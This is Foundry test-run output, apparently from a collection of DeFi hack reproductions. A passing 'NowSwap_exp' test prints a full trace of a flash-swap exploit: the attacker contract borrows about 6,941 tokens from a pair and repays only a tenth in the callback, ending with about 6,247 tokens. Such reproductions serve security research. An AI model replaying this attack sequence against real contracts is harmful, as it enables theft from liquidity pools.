Compiling 25 files with Solc 0.8.10
Compiling 26 files with Solc 0.8.25
Solc 0.8.10 finished in 805.59ms
Solc 0.8.25 finished in 911.07ms
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for src/test/2021-09/NowSwap_exp.sol:ContractTest
[PASS] testExploit() (gas: 142259)
Logs:
  Before exploiting 0
  After exploiting 6247523144463060082611

Traces:
  [147859] ContractTest::testExploit()
    ├─ [4817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("Before exploiting", 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [4817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62) [staticcall]
    │   └─ ← [Return] 7011810487612862045579 [7.011e21]
    ├─ [121525] 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62::swap(0, 6941692382736733425123 [6.941e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000001784f557b6fc1efcde3)
    │   ├─ [28498] 0xEB58343b36C7528F23CAAe63a150240241310049::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6941692382736733425123 [6.941e21])
    │   │   ├─ emit Transfer(from: 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6941692382736733425123 [6.941e21])
    │   │   └─ ← [Return] true
    │   ├─ [5899] ContractTest::NimbusCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 6941692382736733425123 [6.941e21], 0x0000000000000000000000000000000000000000000001784f557b6fc1efcde3)
    │   │   ├─ [817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 6941692382736733425123 [6.941e21]
    │   │   ├─ [3798] 0xEB58343b36C7528F23CAAe63a150240241310049::transfer(0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62, 694169238273673342512 [6.941e20])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62, value: 694169238273673342512 [6.941e20])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [2585] 0x0BCd83DF58a1BfD25b1347F9c9dA1b7118b648a6::balanceOf(0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62) [staticcall]
    │   │   └─ ← [Return] 272244859570035557 [2.722e17]
    │   ├─ [817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62) [staticcall]
    │   │   └─ ← [Return] 764287343149801962968 [7.642e20]
    │   ├─ [2413] 0x6a1a11e8224670186EB4B6DF9A47a204b616D675::nimbusReferralProgram() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000e5ad1a7c9ecfd77c856c211fd5df26a04a72c365
    │   ├─ [8598] 0xEB58343b36C7528F23CAAe63a150240241310049::transfer(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365, 1040728911997313410 [1.04e18])
    │   │   ├─ emit Transfer(from: 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62, to: 0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365, value: 1040728911997313410 [1.04e18])
    │   │   └─ ← [Return] true
    │   ├─ [24067] 0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365::recordFee(0xEB58343b36C7528F23CAAe63a150240241310049, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1040728911997313410 [1.04e18])
    │   │   ├─ [2817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(0xe5AD1a7C9ecfd77C856c211Fd5df26a04a72c365) [staticcall]
    │   │   │   └─ ← [Return] 38193348613012764735287 [3.819e22]
    │   │   └─ ← [Stop] 
    │   ├─ emit Sync(reserve0: 272244859570035557 [2.722e17], reserve1: 764287343149801962968 [7.642e20])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 691737816840880980433 [6.917e20], amount0Out: 0, amount1Out: 6941692382736733425123 [6.941e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [817] 0xEB58343b36C7528F23CAAe63a150240241310049::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 6247523144463060082611 [6.247e21]
    ├─ [0] console::log("After exploiting", 6247523144463060082611 [6.247e21]) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 270.05ms (1.71ms CPU time)

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 292.49ms (208.56µs CPU time)

Ran 2 test suites in 293.81ms (562.54ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
